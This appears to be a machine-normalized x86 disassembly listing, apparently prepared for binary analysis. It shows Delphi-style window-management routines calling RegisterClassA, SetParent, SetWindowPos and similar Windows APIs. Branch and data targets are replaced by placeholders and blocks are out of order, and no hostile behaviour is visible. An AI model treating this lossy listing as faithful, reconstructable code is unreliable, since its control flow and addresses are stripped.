retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x190 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor eax eax
push ebp
push sub_43fa87
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43fac4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43fb89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43bab4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb90
mov eax [ ebp - 0xc ]
call sub_403f64
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_416668
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43b7c8
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4167c8
xor ecx ecx
mov edx 0xb03e
call sub_43d400
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43fb98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ff78
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor edx edx
push ebp
push sub_43fc86
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffbf
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x8 ]
test esi esi
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_416668
mov edx esi
dec edx
mov eax [ ebp - 0xc ]
call sub_4167c8
mov ebx eax
cmp [ ebx + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ff3c
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax ebx
call sub_43b4bc
mov dl 0x4
mov eax ebx
call sub_43b4bc
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4166b4
sub_43fcf4
push ebx
push esi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
call sub_44e778
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_453064
sub_43fd14
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_43a6fc
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_43a6fc
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_43a6fc
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43fd60
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_43a724
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_43a724
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_43a724
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43fda8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_404160
mov [ esp ] ebx
mov [ esp + 0x4 ] edi
push 0x1
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax edi
call sub_43d400
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43d400
mov edx ebx
mov eax edi
call sub_43fd14
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43d400
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43d400
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax edi
call sub_443f88
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43d400
mov eax edi
call sub_440ab4
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43fa00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_43fe9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov [ esp ] esi
mov [ esp + 0x4 ] ebx
push 0x0
mov edi esi
mov ecx edi
mov edx 0xb036
mov eax ebx
call sub_43d400
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov dl 0x1
mov ebp esi
mov eax ebp
call sub_43fcf4
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43fd60
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax ebx
call sub_43d400
push 0x0
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax ebx
call sub_43d400
mov eax ebx
call sub_43fabc
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
movzx edx [ esi + 0x57 ]
mov eax esi
call sub_43c59c
sub_43ff3c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x1cc ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x1d0 ]
call sub_4167c8
mov edx edi
mov eax ebp
call sub_4167c8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43ff98
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43ff3c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43ffd8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43b464
cmp esi [ edi + 0x23c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x23c ] eax
sub_440008
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43ff98
add esp 0x10
retn
sub_440030
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44009c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43c81c
test al al
je r-xdata
mov eax ebx
call sub_43c84c
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc7
call sub_404160
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_404160
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_404160
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_440104
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_440222
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_403728
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44009c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1d8 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x1c4 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_443be8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40a3b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440229
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_440230
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4403f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x1a8 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa0 ]
cmp [ esi + 0x1b4 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40f32c
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40f32c
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_40a57c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_443f94
push 0x1
mov eax [ esi + 0x68 ]
call sub_42364c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43d400
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_443be8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4403f8
lea eax [ ebp - 0xc0 ]
call sub_404e44
retn
mov eax esi
mov si 0xffee
call sub_404160
mov eax [ esi + 0x1b4 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_440400
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_407db8
mov [ esi + 0x1b4 ] eax
pop esi
pop ebx
retn
sub_440440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b7b0
mov eax esi
call sub_41b700
mov [ ebx + 0x242 ] eax
mov eax esi
call sub_41b700
mov [ ebx + 0x246 ] eax
or [ ebx + 0x8c ] 0x20
mov eax esi
call sub_41b7b8
pop esi
pop ebx
retn
sub_440478
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x242 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x246 ] eax
mov eax esi
call sub_41d064
mov edx [ ebx + 0x242 ]
mov eax esi
call sub_41cff0
mov edx [ ebx + 0x246 ]
mov eax esi
call sub_41cff0
mov eax esi
call sub_41d06c
add esp 0x10
pop esi
pop ebx
retn
sub_4404e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x242 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x242
call sub_4404cc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_4167c8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_4167c8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4405c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43daa8
mov eax [ ebp - 0x8 ]
push eax
push sub_440440
mov eax [ ebp - 0x8 ]
push eax
push sub_440478
push ebp
call sub_4404e0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44061c
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
call sub_43a830
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_43c0b8
mov ebx eax
cmp ebx 0x1
jge r-xdata
lea eax [ ebx + 0x1 ]
call sub_40a530
mov edi eax
mov [ esi + 0x64 ] edi
mov eax edi
call sub_40a544
mov ecx eax
mov edx edi
mov eax esi
call sub_43c0c8
mov eax r-xdata
call sub_40a550
mov [ esi + 0x64 ] eax
jmp r-xdata
sub_44067c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4406c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4406d0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40f32c
sub_4406e0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x1d0 ]
mov edx ebx
call sub_416824
mov esi eax
inc esi
mov eax [ edi + 0x1d0 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x1d0 ]
mov edx esi
call sub_4167c8
mov eax [ eax + 0x1b4 ]
test eax eax
jne r-xdata
sub_440728
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa4 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4406e0
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43ff3c
call sub_43b644
inc edi
dec esi
jne r-xdata
sub_4407c0
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
pop ebx
retn
sub_4407e4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
cmp [ esi + 0x232 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov ecx edx
mov edx eax
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
sub_440834
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_438b98
test eax eax
jne r-xdata
push 0xfffffff8
push ebx
call GetWindowLongA
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageA
sub_440878
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1b4 ]
mov [ esp ] eax
test [ esi + 0x55 ] 0x20
setne dl
mov [ esp + 0x4 ] dl
mov edx esp
push edx
push sub_440834
push eax
call EnumChildWindows
mov eax esi
mov edx [ eax ]
call [ edx + 0xb8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_4167c8
mov edx [ eax ]
call [ edx + 0xb0 ]
inc edi
dec ebx
jne r-xdata
sub_440904
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_404160
mov [ ebp - 0x5 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
xor eax eax
push ebp
push sub_440960
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
call sub_440ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440967
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
retn
sub_440967
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetFocus
sub_440990
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
jne r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1da ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x98 ]
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1da ] dl
xor eax eax
push ebp
push sub_440a8c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_4167c8
call sub_440990
inc esi
dec ebx
jne r-xdata
sub_440ab4
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1da ] 0x0
je r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
mov eax esi
call sub_440990
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
sub_440af8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x1c4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
xor eax eax
push ebp
push sub_440bd1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
mov eax [ ebp - 0x4 ]
call sub_440ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c4 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_440ab4
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov ecx 0x30003
mov edx 0x127
mov eax [ ebp - 0x4 ]
call sub_43d400
sub_440bdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440c34
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_440c23
push [ fs : eax ]
mov [ fs : eax ] esp
